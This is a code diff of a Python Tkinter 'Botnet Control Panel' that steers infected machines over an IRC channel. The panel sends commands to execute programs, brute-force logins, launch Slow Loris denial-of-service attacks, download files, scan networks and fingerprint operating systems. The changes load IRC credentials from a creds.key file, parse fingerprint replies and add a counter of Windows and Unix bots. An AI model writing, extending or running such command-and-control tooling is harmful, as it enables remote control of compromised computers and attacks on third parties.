@@ -3,66 +3,53 @@ from socket import socket as sock, AF_INET, SOCK_STREAM, error as sock_error, SH
 from tkinter.messagebox import showinfo
 from threading import Thread
 from time import sleep
-
 root = Tk()
 root.wm_title("Botnet Control Panel")
 root.configure(background="black")
-
 output_box = Text(root, width=75, height=20, background="black", fg="#00FF00")
 output_box.grid(row=1, column=4, rowspan=6)
-
 out_count = 0
 def output(o):
     global out_count
     output_box.insert("end", str(out_count) + "| " + o + "\n")
     output_box.see("end")
     out_count += 1
-
-comm_label = Label(root, text="Quasi Dimensional Multi Directional Relativistic Quantum Transvelocidensity", fg="#00FF00", background="black", justify="center")
+comm_label = Label(root, text="Quasi Dimensional Multi Directional Relativistic Quantum Transvelocidensity", fg="#FF00FF", background="black", justify="center")
 comm_label.grid(row="0", column=0, columnspan=5)
 comm_label.config(font=("System", 20))
-
 server_entry_label = Label(root, text="Server", background="black", fg="red")
 server_entry = Entry(root, bd=1, relief="flat", justify="center", background="#333333", fg="white")
 server_entry_label.grid(row=1, column=0)
 server_entry.grid(row=1, column=1)
-
 port_entry_label = Label(root, text="Port", background="black", fg="red")
 port_entry = Entry(root, bd=1, relief="flat", justify="center", background="#333333", fg="white")
 port_entry_label.grid(row=2, column=0)
 port_entry.grid(row=2, column=1)
-
 username_entry_label = Label(root, text="Nickname", background="black", fg="red")
 username_entry = Entry(root, bd=1, relief="flat", justify="center", background="#333333", fg="white")
 username_entry_label.grid(row=3, column=0)
 username_entry.grid(row=3, column=1)
-
 password_entry_label = Label(root, text="Nickname Password", background="black", fg="red")
 password_entry = Entry(root, bd=1, relief="flat", justify="center", show="*", background="#333333", fg="white")
 password_entry_label.grid(row=4, column=0)
 password_entry.grid(row=4, column=1)
-
 channel_entry_label = Label(root, text="Channel", background="black", fg="red")
 channel_entry = Entry(root, bd=1, relief="flat", justify="center", background="#333333", fg="white")
 channel_entry_label.grid(row=5, column=0)
 channel_entry.grid(row=5, column=1)
-
 chanpass_entry_label = Label(root, text="Channel Password", background="black", fg="red")
 chanpass_entry = Entry(root, bd=1, relief="flat", justify="center", show="*", background="#333333", fg="white")
 chanpass_entry_label.grid(row=6, column=0)
 chanpass_entry.grid(row=6, column=1)
-
 server_entry.insert(0, "irc.freenode.net")
 port_entry.insert(0, "6667")
 username_entry.insert(0, "tjgerot")
 channel_entry.insert(0, "##qdmdrqtvd")
-
 connected = False
 die = False
 s = None
 con_color = "#00FF00"
 child = None
-
 def start_connection(host, port, nick, nickpass, channel, chanpass):
     global connected
     global s
@@ -118,6 +105,9 @@ def connect(host, port, nick, nickpass, channel, chanpass):
         parts = data.decode("UTF-8").split("\r\n")
         for part in parts:
             output(part)
+            if "$FINGERPRINT$" in part:
+                output("Fingerprint recieved. Processing...")
+                part.split("$FINGERPRINT$")[1]
             if "PING" in part:
                 output("Responding to ping request")
                 s.send(("PONG " + part.split()[1] + "\r\n").encode("UTF8"))
@@ -163,10 +153,27 @@ def connect(host, port, nick, nickpass, channel, chanpass):
             # new_button.config(state="normal")
             # new0_button.config(state="normal")
             reported = True
-
-connect_button = Button(root, width=15, height=2, background="green", text="Connect", font=("System", 15), fg="black", bd=0, activebackground=con_color, command=lambda: start_connection(server_entry.get(), int(port_entry.get()), username_entry.get(), password_entry.get(), channel_entry.get(), chanpass_entry.get()))
-connect_button.grid(row=7, column=4, sticky="NESW")
-
+try:
+    with open("creds.key") as creds:
+        keys = [None, None, None, None, None, None]
+        credlines = creds.readlines()
+        for cred in credlines:
+            if cred.split("=")[0].upper() == "SERVER":
+                keys[0] = cred.split("=")[1]
+            elif cred.split("=")[0].upper() == "PORT":
+                keys[1] = cred.split("=")[1]
+            elif cred.split("=")[0].upper() == "NICKNAME":
+                keys[2] = cred.split("=")[1]
+            elif cred.split("=")[0].upper() == "NICKPASS":
+                keys[3] = cred.split("=")[1]
+            elif cred.split("=")[0].upper() == "CHANNEL":
+                keys[4] = cred.split("=")[1]
+            elif cred.split("=")[0].upper() == "CHANPASS":
+                keys[5] = cred.split("=")[1]
+    connect_button = Button(root, width=15, height=2, background="green", text="Connect", font=("System", 15), fg="black", bd=0, activebackground=con_color, command=lambda: start_connection(keys[0], int(keys[1]), keys[2], keys[3], keys[4], keys[5]))
+except FileNotFoundError:
+    connect_button = Button(root, width=15, height=2, background="green", text="Connect", font=("System", 15), fg="black", bd=0, activebackground=con_color, command=lambda: start_connection(server_entry.get(), int(port_entry.get()), username_entry.get(), password_entry.get(), channel_entry.get(), chanpass_entry.get()))
+connect_button.grid(row=7, column=0, columnspan=2, sticky="NESW")
 def send_command(command):
     global s
     commands = ["Execute", "Brute Force", "Report Address", "Fingerprint OS", "Commit Suicide", "Send Email", "Slow Loris", "Reconnect", "Download File", "Profile Computer", "Scan Host", "Scan Network"]
@@ -278,11 +285,11 @@ def send_command(command):
         verbose_label.grid(row=0, column=0)
         verbose_box.grid(row=0, column=1)
         submit = Button(child, width=35, text="Begin", command=lambda:s.send(("PRIVMSG " + channel_entry.get() + " :COMMAND PROFILE " + ("VERBOSE" if verbose else "") + "\r\n").encode("UTF8")))
+        submit.grid(row=1, column=0, columnspan=2, sticky="NESW")
     elif command is 10:
         pass
     elif command is 11:
         pass
-
 exec_button = Button(root, text="Execute Command", state="disabled", command=lambda:send_command(0))
 exec_button.grid(row=1, column=3, sticky="NESW")
 ssh_button = Button(root, text="Brute Force", state="disabled", command=lambda:send_command(1))
@@ -307,7 +314,8 @@ new_button = Button(root, text="Scan Host", state="disabled", command=lambda:sen
 new_button.grid(row=6, column=3, sticky="NESW")
 new0_button = Button(root, text="Scan Network", state="disabled", command=lambda:send_command(11))
 new0_button.grid(row=6, column=2, sticky="NESW")
-
+stats_label = Label(root, text="Bots: 0    |    Windows: 0    |    Unix: 0    |    Latency: 0ms", font=("System", 10))
+stats_label.grid(row=7, column=2)
 def on_closing():
     global connected
     try:
